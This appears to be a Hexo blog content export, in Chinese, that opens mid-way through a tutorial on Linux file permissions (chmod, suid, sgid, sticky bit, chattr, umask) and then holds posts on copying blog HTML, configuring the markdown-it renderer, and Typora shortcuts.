<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>+</td>
<td>增加权限</td>
</tr>
<tr>
<td>-</td>
<td>撤销权限</td>
</tr>
<tr>
<td>=</td>
<td>设定权限</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th>rwx</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>r</td>
<td>read 表示可读取，对于一个目录，如果没有r权限，那么就意味着不能通过ls查看这个目录的内容。</td>
</tr>
<tr>
<td>w</td>
<td>write 表示可写入，对于一个目录，如果没有w权限，那么就意味着不能在目录下创建新的文件。</td>
</tr>
<tr>
<td>x</td>
<td>excute 表示可执行，对于一个目录，如果没有x权限，那么就意味着不能通过cd进入这个目录。</td>
</tr>
</tbody>
</table>
<p>数字法：“rwx” 这些权限也可以用数字来代替</p>
<table>
<thead>
<tr>
<th>字母</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>r</td>
<td>读取权限，数字代号为 “4”</td>
</tr>
<tr>
<td>w</td>
<td>写入权限，数字代号为 “2”</td>
</tr>
<tr>
<td>x</td>
<td>执行权限，数字代号为 “1”</td>
</tr>
<tr>
<td>-</td>
<td>不具任何权限，数字代号为 “0”</td>
</tr>
</tbody>
</table>
<p>如执行：chmod u=rwx,g=rx,o=r filename 就等同于：chmod u=7,g=5,o=4 filename</p>
<p>chmod 751 file：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>文件所有者：读、写、执行权限</p>
</li>
<li class="lvl-2">
<p>同组用户：读、执行的权限</p>
</li>
<li class="lvl-2">
<p>其它用户：执行的权限</p>
</li>
</ul>
<p>chmod 777 file：所有用户拥有读、写、执行权限</p>
<p>注意：如果想递归所有目录加上相同权限，需要加上参数“ -R ”。 如：chmod 777 test/ -R 递归 test 目录下所有文件加 777 权限</p>
<h3 id="修改文件所有者：chown">修改文件所有者：chown</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[Corazon@rocky8:~]$ ll a</span><br><span class="line">-rw-rw-r--. 1 Corazon Corazon 0 Feb 19 13:31 a</span><br><span class="line">[Corazon@rocky8:~]$ su</span><br><span class="line">Password: </span><br><span class="line">[root@rocky8:Corazon]# <span class="built_in">chown</span> Cora a</span><br><span class="line">[root@rocky8:Corazon]# ll a</span><br><span class="line">-rw-rw-r--. 1 Cora Corazon 0 Feb 19 13:31 a</span><br></pre></td></tr></table></figure>
<h3 id="修改文件所属组：chgrp">修改文件所属组：chgrp</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:Corazon]# ll a</span><br><span class="line">-rw-rw-r--. 1 Cora Corazon 0 Feb 19 13:31 a</span><br><span class="line">[root@rocky8:Corazon]# ll a</span><br><span class="line">-rw-rw-r--. 1 Cora Corazon 0 Feb 19 13:31 a</span><br><span class="line">[root@rocky8:Corazon]# <span class="built_in">chgrp</span> Cora a</span><br><span class="line">[root@rocky8:Corazon]# ll a</span><br><span class="line">-rw-rw-r--. 1 Cora Cora 0 Feb 19 13:31 a</span><br></pre></td></tr></table></figure>
<h2 id="特殊权限">特殊权限</h2>
<p>linux共12位权限，除了9位基础权限还有3个特殊权限。</p>
<h3 id="三种特殊的权限">三种特殊的权限</h3>
<h4 id="SetUID-suid">SetUID(suid)</h4>
<p><strong>命令功能：</strong> **临时使用命令的属主权限执行该命令。**即如果文件有suid权限时，那么普通用户去执行该文件时，会以该文件的所属用户的身份去执行。</p>
<p>SetUID（简写suid）：会在属主权限位的执行权限上写个s。 如果该属主权限位上有执行权限，则会在属主权限位的执行权限上写个s（小写）； 如果该属主权限位上没有执行权限，则会在属主权限位的执行权限上写个S（大写）。</p>
<p>suid数字权限是4000,设置方法：</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">方式<span class="number">1</span>：</span><br><span class="line">[root<span class="symbol">@centos7</span> ~]<span class="meta"># chmod u+s filename</span></span><br><span class="line">方式<span class="number">2</span>：</span><br><span class="line">[root<span class="symbol">@centos7</span> ~]<span class="meta"># chmod 4755 filename</span></span><br><span class="line"><span class="number">1234</span></span><br></pre></td></tr></table></figure>
<p>查看passwd命令的权限</p>
<figure class="highlight autohotkey"><table><tr><td class="code"><pre><span class="line">`[root@localhost ftl]``# ll /usr/bin/passwd ` `问题： ``passwd``文件的属组是root,表示只有root用户可以访问的文件，为什么普通用户依然可以使用该命令更改自己的密码？``答案：当普通用户[omd]使用``passwd``命令的时候，系统看到``passwd``命令文件的属性有大写s后，表示这个命令的属主权限被omd用户获得,也就是omd用户获得文件``/etc/shadow``的root的rwx权限`</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>由于<code>passwd</code>具有s权限，普通用户使用该命令的时候，就会以该命令的属主身份root执行该命令，于是能够顺利修改普通用户不具备修改权限的<code>/etc/shadow</code>文件。</p>
<p>希望普通用户user1可以删除某个自己没有权限删除的文件的操作方法：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>sudo给user1授权rm权限</p>
</li>
<li class="lvl-2">
<p>rm设置suid</p>
</li>
<li class="lvl-2">
<p>修改被删除文件上级目录的权限</p>
</li>
</ul>
<p><strong>SetUID（简称suid）总结：</strong></p>
<ol>
<li class="lvl-3">
<p>让普通用户对可执行的二进制文件，临时拥有二进制文件的属主权限；</p>
</li>
<li class="lvl-3">
<p>如果设置的二进制文件没有执行权限，那么suid的权限显示就是S（大写字母S）；</p>
</li>
<li class="lvl-3">
<p>特殊权限suid仅对二进制可执行程序有效，其他文件或目录则无效。</p>
</li>
<li class="lvl-3">
<p>suid极其危险，如果给vim或者rm命令设置了setUID，那么任何文件都能编辑或者删除了，相当于有root权限了。</p>
</li>
</ol>
<h4 id="setGID（sgid）">setGID（sgid）</h4>
<p>**命令功能：**使用sgid可以使得多个用户之间共享一个目录的所有文件变得简单。当某个目录设置了sgid后，在该目录中新建的文件不在是创建该文件的默认所属组。</p>
<p>如果该属组权限位上有执行权限，则会在属组主权限位的执行权限上写个s（小写字母）； 如果该属组权限位上没有执行权限，则会在属组主权限位的执行权限上写个S（大写字母S）。</p>
<p>write命令的权限：</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">[root@VM_0_9_centos ~]# ll <span class="regexp">/bin/</span><span class="keyword">write</span> </span><br><span class="line">-rwxr-sr-x <span class="number">1</span> root tty <span class="number">19544</span> Aug  <span class="number">9</span> <span class="number">11</span>:<span class="number">10</span> <span class="regexp">/bin/</span><span class="keyword">write</span></span><br><span class="line"><span class="number">12</span></span><br></pre></td></tr></table></figure>
<p>sgid数字权限是2000，设置方法：</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">方式<span class="number">1</span>：</span><br><span class="line">[root<span class="symbol">@VM_0_9_centos</span> ~]<span class="meta"># chmod 2755 test/</span></span><br><span class="line">方式<span class="number">2</span>：</span><br><span class="line">[root<span class="symbol">@VM_0_9_centos</span> ~]<span class="meta"># chmod g+s test/</span></span><br><span class="line"></span><br><span class="line">[root<span class="symbol">@VM_0_9_centos</span> ~]<span class="meta"># ll -d test/</span></span><br><span class="line">drwxr-sr-x <span class="number">2</span> root root <span class="number">4096</span> Nov <span class="number">22</span> <span class="number">21</span>:<span class="number">02</span> test/</span><br><span class="line"><span class="number">1234567</span></span><br></pre></td></tr></table></figure>
<p>在设置SetGID的文件夹创建文件的属组是父目录的属组：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@VM_0_9_centos ~]# <span class="built_in">cd</span> <span class="built_in">test</span>/</span><br><span class="line">[root@VM_0_9_centos <span class="built_in">test</span>]# su aaa</span><br><span class="line">[aaa@VM_0_9_centos <span class="built_in">test</span>]$ <span class="built_in">touch</span> bbb</span><br><span class="line">[aaa@VM_0_9_centos <span class="built_in">test</span>]$ ll</span><br><span class="line">-rw-rw-r-- 1 aaa  root 0 Nov 22 21:14 bbb</span><br><span class="line">12345</span><br></pre></td></tr></table></figure>
<h4 id="sticky-sbit-粘滞位">sticky(sbit)粘滞位</h4>
<p>**命令功能：**粘滞位，只对目录有效，对某目录设置粘滞位后，普通用户就算有w权限也只能删除该目录下自己建立的文件，而不能删除其他用户建立的文件。</p>
<p>如果该其他用户权限位上有执行权限，则会在其他用户权限位的执行权限上写个t（小写）； 如果该其它用户权限位上没有执行权限，则会在其他用户权限位的执行权限上写个T（大写）。</p>
<p>系统中存在的/tmp目录是经典的粘滞位目录，谁都有写权限，因此安全成问题，常常是木马第一手跳板。</p>
<figure class="highlight swift"><table><tr><td class="code"><pre><span class="line">[aaa<span class="meta">@VM_0_9_centos</span> <span class="operator">~</span>]$ ll <span class="operator">-</span>d <span class="regexp">/tmp/</span> </span><br><span class="line">drwxrwxrwt. <span class="number">9</span> root root <span class="number">4096</span> <span class="type">Nov</span> <span class="number">22</span> <span class="number">21</span>:<span class="number">15</span> <span class="regexp">/tmp/</span></span><br><span class="line"><span class="number">12</span></span><br></pre></td></tr></table></figure>
<p>sbit数字权限是1000，设置方法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">方法1：</span><br><span class="line">[root@VM_0_9_centos ~]# <span class="built_in">chmod</span> 1755 <span class="built_in">test</span>/</span><br><span class="line">方法2：</span><br><span class="line">[root@VM_0_9_centos ~]# <span class="built_in">chmod</span> o+t <span class="built_in">test</span>/ </span><br><span class="line">查看权限：</span><br><span class="line">[root@VM_0_9_centos ~]# ll -d <span class="built_in">test</span>/    </span><br><span class="line">drwxr-xr-t 2 root root 4096 Nov 22 21:15 <span class="built_in">test</span>/</span><br><span class="line">1234567</span><br></pre></td></tr></table></figure>
<h3 id="chattr权限">chattr权限</h3>
<p>chattr概述：凌驾于r、w、x、suid、sgid之上的权限。</p>
<h4 id="lsattr：查看特殊权限">lsattr：查看特殊权限</h4>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">[root<span class="variable">@VM_0_9_centos</span> ~]<span class="comment"># lsattr /etc/passwd</span></span><br><span class="line">-------------e-- <span class="regexp">/etc/passwd</span></span><br><span class="line"><span class="number">12</span></span><br></pre></td></tr></table></figure>
<h4 id="chattr：设置特殊权限">chattr：设置特殊权限</h4>
<table>
<thead>
<tr>
<th>权限说明</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>-i</td>
<td>锁定文件，不能编辑，不能修改，不能删除，不能移动，可以执行</td>
</tr>
<tr>
<td>-a</td>
<td>仅可以追加文件，不能编辑，不能删除，不能移动，可以执行</td>
</tr>
</tbody>
</table>
<p>防止系统中某个关键文件被修改：</p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">[root<span class="variable">@VM_0_9_centos</span> ~]<span class="comment"># chattr +i /etc/fstab</span></span><br><span class="line">[root<span class="variable">@VM_0_9_centos</span> ~]<span class="comment"># lsattr /etc/fstab   </span></span><br><span class="line">----i--------e-- <span class="regexp">/etc/fstab</span></span><br><span class="line"><span class="number">123</span></span><br></pre></td></tr></table></figure>
<p>让某个文件只能往里面追加内容，不能删除，一些日志文件适用于这种操作：</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">[root<span class="symbol">@VM_0_9_centos</span> ~]<span class="meta"># chattr +a user_act.log</span></span><br><span class="line">[root<span class="symbol">@VM_0_9_centos</span> ~]<span class="meta"># lsattr user_act.log </span></span><br><span class="line">-----a-------e-- user_act.<span class="built_in">log</span></span><br><span class="line"><span class="number">123</span></span><br></pre></td></tr></table></figure>
<h3 id="掩码umask">掩码umask</h3>
<h4 id="umask的作用">umask的作用</h4>
<p>umask值用于设置用户在创建文件时的默认权限，当我们在系统中创建目录或文件时，目录或文件所具有的默认权限就是由umask值决定的。</p>
<p>对于root用户，系统默认的umask值是0022；对于普通用户，系统默认的umask值是0002。执行umask命令可以查看当前用户的umask值。</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">[root<span class="symbol">@VM_0_9_centos</span> ~]<span class="meta"># umask</span></span><br><span class="line"><span class="number">0022</span></span><br><span class="line"><span class="number">12</span></span><br></pre></td></tr></table></figure>
<h4 id="umask是如何改变新文件的权限">umask是如何改变新文件的权限</h4>
<p>umask值一共有4组数字，其中第1组数字用于定义特殊权限，一般不予考虑，与一般权限有关的是后3组数字。</p>
<p>默认情况下，对于目录，用户所能拥有的最大权限是777；对于文件，用户所能拥有的最大权限是目录的最大权限去掉执行权限，即666。因为x执行权限对于目录是必须的，没有执行权限就无法进入目录，而对于文件则不必默认赋予x执行权限。</p>
<p>对于root用户，他的umask值是022。当root用户创建目录时，默认的权限就是用最大权限777去掉相应位置的umask值权限，即对于所有者不必去掉任何权限，对于所属组要去掉w权限，对于其他用户也要去掉w权限，所以目录的默认权限就是755；当root用户创建文件时，默认的权限则是用最大权限666去掉相应位置的umask值，即文件的默认权限是644。</p>
<p>通过umask命令可以修改umask值，比如将umask值设为0077。</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">[root<span class="symbol">@VM_0_9_centos</span> ~]<span class="meta"># umask 0077</span></span><br><span class="line">[root<span class="symbol">@VM_0_9_centos</span> ~]<span class="meta"># umask</span></span><br><span class="line"><span class="number">0077</span></span><br><span class="line"><span class="number">123</span></span><br></pre></td></tr></table></figure>
<h4 id="永久修改umask">永久修改umask</h4>
<p>umask命令只能临时修改umask值，系统重启之后umask将还原成默认值。如果要永久修改umask值，可修改<code>/etc/bashrc</code>或<code>/etc/profile</code>文件。</p>
<p>例如要将默认umask值设置为027，那么可以在文件中增加一行<code>umask 027</code>。</p>
<p>本文参考：</p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>基础知识</category>
        <category>Linux</category>
        <category>Linux基础</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>【Hexo】博客复制粘贴</title>
    <url>/posts/4fb642e/</url>
    <content><![CDATA[<p>本文介绍使用chrom浏览器，在源码中copy element可以将博客复制下来，直接粘贴到自己的博客里。方便后期的更改。</p>
<span id="more"></span>
<ol>
<li class="lvl-3">
<p>首先,在自己喜欢的博客页面,点击鼠标右键,看到如下图片,点击最后一行<code>检查</code></p>
</li>
</ol>
<p><img src="/posts/4fb642e//image-20250218162611570.png" alt="image-20250218162611570"></p>
<ol start="2">
<li class="lvl-3">
<p>然后,在右边的源码里边,找到&quot;article_content&quot;标签头,可以看到左侧部分的预览界面被选中的部分就是要复制粘贴文章(包括html部分),检查左侧被选中的部分是否是自己想要的部分.</p>
</li>
</ol>
<p><img src="/posts/4fb642e//image-20250218163315027.png" alt="image-20250218163315027"></p>
<ol start="3">
<li class="lvl-3">
<p>之后,再右键选择该标签(“article_content”),如下图,选择Copy element复制(或者Cut element 剪切)该标签下的所有元素</p>
</li>
</ol>
<p><img src="/posts/4fb642e//image-20250218163453271.png" alt="image-20250218163453271"></p>
<ol start="4">
<li class="lvl-3">
<p>新建一个 txt 文件，将后缀改为 .html ，把刚复制的 源代码 粘贴到文件中，浏览器打开后如下图，此时复制全文到markdown的软件<a href="https://www.typora.io/">Typora</a>中</p>
</li>
</ol>
<p><img src="/posts/4fb642e//image-20250220122601039.png" alt="image-20250220122601039"></p>
<p>本文参考：</p>
<p><a href="https://blog.csdn.net/qq_36437693/article/details/127286941">如何csdn复制他人博客文章到自己博客下</a></p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>Hexo</category>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>【Hexo】更高级的Markdown渲染器——hexo-renderer-markdown-it</title>
    <url>/posts/e3e8d0c4/</url>
    <content><![CDATA[<p>Hexo 默认搭配的 Markdown 渲染器是 hexo-renderer-marked，但其支持的渲染格式有限，不利于自由写作。因此，今天教大家如何更换为功能更加强大，渲染速度更快的 hexo-renderer-markdown-it 渲染器，并且还会详细介绍常用插件的配置，实现更优雅的 Markdown 写作。</p>
<p>container和footnote不知道为什么不能使用，估计也用不上，暂时不处理了。原文在参考文章里。</p>
<span id="more"></span>
<h2 id="安装">安装</h2>
<p>卸载 <code>hexo-renderer-marked</code></p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">npm un hexo-renderer-marked <span class="comment">--save</span></span><br></pre></td></tr></table></figure>
<p>安装 <code>hexo-renderer-markdown-it</code></p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">npm i hexo-renderer-markdown-<span class="keyword">it</span> <span class="comment">--save</span></span><br></pre></td></tr></table></figure>
<h2 id="配置">配置</h2>
<p>将如下文本复制粘贴到 <a href="https://so.csdn.net/so/search?q=Hexo&amp;spm=1001.2101.3001.7020">Hexo</a> 的配置文件 <code>_config.yml</code> 的尾部</p>
<figure class="highlight nestedtext"><table><tr><td class="code"><pre><span class="line"><span class="attribute">markdown</span><span class="punctuation">:</span></span><br><span class="line">  <span class="attribute">preset</span><span class="punctuation">:</span> <span class="string">&quot;default&quot;</span></span><br><span class="line">  <span class="attribute">render</span><span class="punctuation">:</span></span><br><span class="line">    <span class="attribute">html</span><span class="punctuation">:</span> <span class="string">true</span></span><br><span class="line">    <span class="attribute">xhtmlOut</span><span class="punctuation">:</span> <span class="string">false</span></span><br><span class="line">    <span class="attribute">langPrefix</span><span class="punctuation">:</span> <span class="string">&quot;language-&quot;</span></span><br><span class="line">    <span class="attribute">breaks</span><span class="punctuation">:</span> <span class="string">true</span></span><br><span class="line">    <span class="attribute">linkify</span><span class="punctuation">:</span> <span class="string">true</span></span><br><span class="line">    <span class="attribute">typographer</span><span class="punctuation">:</span> <span class="string">true</span></span><br><span class="line">    <span class="attribute">quotes</span><span class="punctuation">:</span> <span class="string">&quot;“”‘’&quot;</span></span><br><span class="line">  <span class="attribute">enable_rules</span><span class="punctuation">:</span></span><br><span class="line">  <span class="attribute">disable_rules</span><span class="punctuation">:</span></span><br><span class="line">  <span class="attribute">plugins</span><span class="punctuation">:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">markdown-it-abbr</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">markdown-it-cjk-breaks</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">markdown-it-deflist</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">markdown-it-emoji</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">markdown-it-footnote</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">markdown-it-ins</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">markdown-it-mark</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">markdown-it-sub</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">markdown-it-sup</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">markdown-it-checkbox</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">markdown-it-imsize</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">markdown-it-expandable</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">name: markdown-it-container</span></span><br><span class="line">      <span class="attribute">options</span><span class="punctuation">:</span> <span class="string">success</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">name: markdown-it-container</span></span><br><span class="line">      <span class="attribute">options</span><span class="punctuation">:</span> <span class="string">tips</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">name: markdown-it-container</span></span><br><span class="line">      <span class="attribute">options</span><span class="punctuation">:</span> <span class="string">warning</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">name: markdown-it-container</span></span><br><span class="line">      <span class="attribute">options</span><span class="punctuation">:</span> <span class="string">danger</span></span><br><span class="line">  <span class="attribute">anchors</span><span class="punctuation">:</span></span><br><span class="line">    <span class="attribute">level</span><span class="punctuation">:</span> <span class="string">2</span></span><br><span class="line">    <span class="attribute">collisionSuffix</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="attribute">permalink</span><span class="punctuation">:</span> <span class="string">false</span></span><br><span class="line">    <span class="attribute">permalinkClass</span><span class="punctuation">:</span> <span class="string">&quot;header-anchor&quot;</span></span><br><span class="line">    <span class="attribute">permalinkSide</span><span class="punctuation">:</span> <span class="string">&quot;left&quot;</span></span><br><span class="line">    <span class="attribute">permalinkSymbol</span><span class="punctuation">:</span> <span class="string">&quot;¶&quot;</span></span><br><span class="line">    <span class="attribute">case</span><span class="punctuation">:</span> <span class="string">0</span></span><br><span class="line">    <span class="attribute">separator</span><span class="punctuation">:</span> <span class="string">&quot;-&quot;</span></span><br></pre></td></tr></table></figure>
<h2 id="插件">插件</h2>
<p>本章节讲述各种插件的用法、配置和注意事项。</p>
<h3 id="安装-2">安装</h3>
<p>分别使用 <code>npm</code> 命令安装以下三个插件：</p>
<figure class="highlight livescript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">npm</span> i markdown-<span class="literal">it</span>-checkbox</span><br><span class="line"><span class="built_in">npm</span> i markdown-<span class="literal">it</span>-imsize</span><br><span class="line"><span class="built_in">npm</span> i markdown-<span class="literal">it</span>-expandable</span><br></pre></td></tr></table></figure>
<p>其它插件 <code>hexo-renderer-markdown-it</code> 渲染器自带的有，不要安装。</p>
<h3 id="用法">用法</h3>
<h4 id="基础">基础</h4>
<table>
<thead>
<tr>
<th>名称</th>
<th>描述</th>
<th>语法</th>
<th>示例</th>
</tr>
</thead>
<tbody>
<tr>
<td>markdown-it-abbr</td>
<td>注释</td>
<td><code>*[HTML]: 超文本标记语言</code></td>
<td>*[HTML]: 超文本标记语言</td>
</tr>
<tr>
<td>markdown-it-emoji</td>
<td>表情</td>
<td><code>:)</code>  <code>:crab:</code>  <code>:horse:</code></td>
<td>😃 🦀 🐴</td>
</tr>
<tr>
<td>markdown-it-footnote</td>
<td>脚注</td>
<td><code>参考文献&lt;sup id=&quot;fnref:1&quot;&gt;&lt;a href=&quot;#fn:1&quot; rel=&quot;footnote&quot;&gt;1&lt;/a&gt;&lt;/sup&gt;</code></td>
<td>参考文献<sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup></td>
</tr>
<tr>
<td>markdown-it-ins</td>
<td>下划线</td>
<td><code>++下划线++</code></td>
<td><ins>下划线</ins></td>
</tr>
<tr>
<td>markdown-it-mark</td>
<td>突出显示</td>
<td><code>==标记==</code></td>
<td><mark>标记</mark></td>
</tr>
<tr>
<td>markdown-it-sub</td>
<td>下标</td>
<td><code>H~2~O</code></td>
<td>H<sub>2</sub>O</td>
</tr>
<tr>
<td>markdown-it-sup</td>
<td>上标</td>
<td><code>X^2^</code></td>
<td>X<sup>2</sup></td>
</tr>
<tr>
<td>markdown-it-checkbox</td>
<td>复选框</td>
<td><input type="checkbox" id="checkbox1"><label for="checkbox1"></label>未选 <br> <input type="checkbox" id="checkbox0" checked="true"><label for="checkbox0"></label>选中</td>
<td><img src="/posts/e3e8d0c4//image-20241111151833850.png" alt="image-20241111151833850"></td>
</tr>
</tbody>
</table>
<ul class="lvl-0">
<li class="lvl-2">
<p><input type="checkbox" id="checkbox2"><label for="checkbox2">未选</label></p>
</li>
<li class="lvl-2">
<p><input type="checkbox" id="checkbox3" checked="true"><label for="checkbox3">选中</label></p>
</li>
</ul>
<h4 id="进阶">进阶</h4>
<blockquote>
<p><a href="https://github.com/tatsy/markdown-it-imsize">markdown-it-imsize</a>：自定义图片宽高。</p>
</blockquote>
<p>语法：（<strong>注意</strong>：<code>=100x200</code> 前面有一个空格）</p>
<figure class="highlight scss"><table><tr><td class="code"><pre><span class="line">!<span class="selector-attr">[test]</span>(<span class="number">006</span>.png =<span class="number">100</span>x200)</span><br></pre></td></tr></table></figure>
<p><img src="/posts/e3e8d0c4//006.png" alt="test" width="100" height="200"></p>
<blockquote>
<p><a href="https://github.com/bioruebe/markdown-it-collapsible">markdown-it-expandable</a>：折叠/展开内容。</p>
</blockquote>
<p>语法：</p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line"><span class="code">+++</span> <span class="strong">**点击折叠**</span></span><br><span class="line"><span class="section">这是被隐藏的内容</span></span><br><span class="line"><span class="section">+++</span></span><br></pre></td></tr></table></figure>
<p>效果：</p>
<details open>
<summary><span class="pre-summary">&nbsp;</span><strong>点击折叠</strong></summary><p>这是被隐藏的内容</p>
</details>
<blockquote>
<p><a href="https://github.com/markdown-it/markdown-it-container">markdown-it-container</a>：自定义容器。</p>
</blockquote>
<p>语法：</p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line"><span class="meta">:::</span> tips</span><br><span class="line"><span class="strong">**提示**</span></span><br><span class="line">这是一个提示</span><br><span class="line"><span class="meta">:::</span></span><br><span class="line"></span><br><span class="line"><span class="meta">:::</span> warning</span><br><span class="line"><span class="strong">**注意**</span></span><br><span class="line">这是一个警告</span><br><span class="line"><span class="meta">:::</span></span><br><span class="line"></span><br><span class="line"><span class="meta">:::</span> danger</span><br><span class="line"><span class="strong">**警告**</span></span><br><span class="line">这是一个危险信号</span><br><span class="line"><span class="meta">:::</span></span><br><span class="line"></span><br><span class="line"><span class="meta">:::</span> success</span><br><span class="line"><span class="strong">**成功**</span></span><br><span class="line">这是一个成功信号</span><br><span class="line"><span class="meta">:::</span></span><br></pre></td></tr></table></figure>
<p>效果：</p>
<div class="tips">
<p><strong>提示</strong><br>
这是一个提示</p>
</div>
<div class="warning">
<p><strong>注意</strong><br>
这是一个警告</p>
</div>
<div class="danger">
<p><strong>警告</strong><br>
这是一个危险信号</p>
</div>
<div class="success">
<p><strong>成功</strong><br>
这是一个成功信号</p>
</div>
<p>本文参考：</p>
<p><a href="https://blog.csdn.net/qq_42951560/article/details/123596899">【Hexo】选择更高级的Markdown渲染器</a></p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>Hexo</category>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>【Typora】typora快捷键</title>
    <url>/posts/d6f6acd6/</url>
    <content><![CDATA[<table>
<thead>
<tr>
<th style="text-align:center">功能</th>
<th style="text-align:center">快捷键</th>
<th style="text-align:center">功能</th>
<th style="text-align:center">快捷键</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">加粗</td>
<td style="text-align:center">Ctrl+B</td>
<td style="text-align:center">插入图像</td>
<td style="text-align:center">Ctrl+Shift+I</td>
</tr>
<tr>
<td style="text-align:center">斜体</td>
<td style="text-align:center">Ctrl+I</td>
<td style="text-align:center">删除线</td>
<td style="text-align:center">Alt+Shift+5</td>
</tr>
<tr>
<td style="text-align:center">下划线</td>
<td style="text-align:center">Ctrl+U</td>
<td style="text-align:center">公式块</td>
<td style="text-align:center">Ctrl+Shift+M</td>
</tr>
<tr>
<td style="text-align:center">超链接</td>
<td style="text-align:center">Ctrl+K</td>
<td style="text-align:center">代码块</td>
<td style="text-align:center">Ctrl+Shift+K</td>
</tr>
<tr>
<td style="text-align:center">表格</td>
<td style="text-align:center">Ctrl+T</td>
<td style="text-align:center">代码段</td>
<td style="text-align:center">Ctrl+Shift+`</td>
</tr>
<tr>
<td style="text-align:center">引用</td>
<td style="text-align:center">&gt;+空格</td>
<td style="text-align:center">退出引用</td>
<td style="text-align:center">Shift+Tab</td>
</tr>
<tr>
<td style="text-align:center">段落</td>
<td style="text-align:center">Ctrl+0</td>
<td style="text-align:center">有序列表</td>
<td style="text-align:center">Ctrl+Shift+[</td>
</tr>
<tr>
<td style="text-align:center">标题</td>
<td style="text-align:center">Ctrl+数字</td>
<td style="text-align:center">无序列表</td>
<td style="text-align:center">Ctrl+Shift+]</td>
</tr>
<tr>
<td style="text-align:center">全选</td>
<td style="text-align:center">Ctrl+A</td>
<td style="text-align:center">选中行/句</td>
<td style="text-align:center">Ctrl+L</td>
</tr>
<tr>
<td style="text-align:center">选中段落</td>
<td style="text-align:center">Ctrl+E</td>
<td style="text-align:center">选中当前词</td>
<td style="text-align:center">Ctrl+D</td>
</tr>
<tr>
<td style="text-align:center">跳转所选</td>
<td style="text-align:center">Ctrl+J</td>
<td style="text-align:center">跳转文首/末</td>
<td style="text-align:center">Ctrl+Home/End</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center">源代码模式</td>
<td style="text-align:center">Ctrl+/</td>
</tr>
</tbody>
</table>
<span id="more"></span>
<p>下方背诵表</p>
<p>  ↓<br>
  ↓<br>
  ↓<br>
  ↓<br>
  ↓<br>
  ↓<br>
  ↓<br>
  ↓<br>
  ↓<br>
  ↓<br>
  ↓<br>
  ↓<br>
  ↓<br>
  ↓<br>
  ↓<br>
  ↓<br>
  ↓</p>
<table>
<thead>
<tr>
<th style="text-align:center">功能</th>
<th style="text-align:center">快捷键</th>
<th style="text-align:center">功能</th>
<th style="text-align:center">快捷键</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">加粗</td>
<td style="text-align:center"></td>
<td style="text-align:center">插入图像</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">斜体</td>
<td style="text-align:center"></td>
<td style="text-align:center">删除线</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">下划线</td>
<td style="text-align:center"></td>
<td style="text-align:center">公式块</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">超链接</td>
<td style="text-align:center"></td>
<td style="text-align:center">代码块</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">表格</td>
<td style="text-align:center"></td>
<td style="text-align:center">代码段</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">引用</td>
<td style="text-align:center"></td>
<td style="text-align:center">退出引用</td>
<td style="text-align:center"></td>
</tr>
